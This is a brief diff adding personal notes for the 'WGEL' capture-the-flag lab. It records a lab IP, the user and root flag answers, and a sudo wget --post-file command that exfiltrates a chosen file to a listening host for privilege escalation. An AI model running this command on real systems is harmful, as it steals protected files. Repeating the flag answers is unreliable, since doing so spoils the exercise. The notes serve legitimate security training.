@@ -1,0 +1,9 @@
+                                         WGEL CTF
+
+        
+        wget pe==sudo /usr/bin/wget --post-file=<path of file> <Listening IP>
+        IP=10.10.212.205
+
+        #1 USER FLAG=057c67131c3d5e42dd5cd3075b198ff6
+
+        #2 ROOT FLAG=b1b968b37519ad1daa6408188649263d
